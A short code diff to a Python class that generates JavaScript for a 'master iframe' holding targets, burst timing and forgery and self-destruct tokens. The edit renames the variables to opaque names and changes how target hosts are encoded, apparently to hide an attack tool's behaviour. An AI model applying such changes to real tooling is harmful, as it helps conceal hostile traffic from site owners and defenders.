@@ -59,7 +59,7 @@ class PersistentData:
 
 
     def setMasterIframeVars(self,sleepDuration, burstDuration, targets_fd, runWhileInFocus, nibble, obfuscateTargets):
-        self.masterIframeVars = "var _LUPIN_TOKEN=\""+self._LUPIN_TOKEN+"\";var _FORGERY =\""+self._FORGERY+"\" ;var _DESTRUCT=\""+self._DESTRUCT+"\";var targetsObfuscated="+obfuscateTargets+"; var runWhileInFocus="+runWhileInFocus+";var nibble="+nibble+";var sleepDuration="+str(sleepDuration)+"; var burstDuration="+str(burstDuration)+";var targets=["
+        self.masterIframeVars = "var p0=\""+self._LUPIN_TOKEN+"\";var p1=\""+self._FORGERY+"\";var p2=\""+self._DESTRUCT+"\";var p3="+obfuscateTargets+";var p4="+runWhileInFocus+";var p5="+nibble+";var p6="+str(sleepDuration)+";var p7="+str(burstDuration)+";var p8=["
         targets_fd.seek(0,0)
         for filelineno,line in enumerate(targets_fd):
             if '\n' in line:
@@ -83,7 +83,7 @@ class PersistentData:
     def obfuscate(self,host):
         obfs = ""
         for letter in host:
-            obfs+=str(ord(letter)+255)+"."
+            obfs+=str(ord(letter)-40)+"."
         return obfs[:-1]
 
     
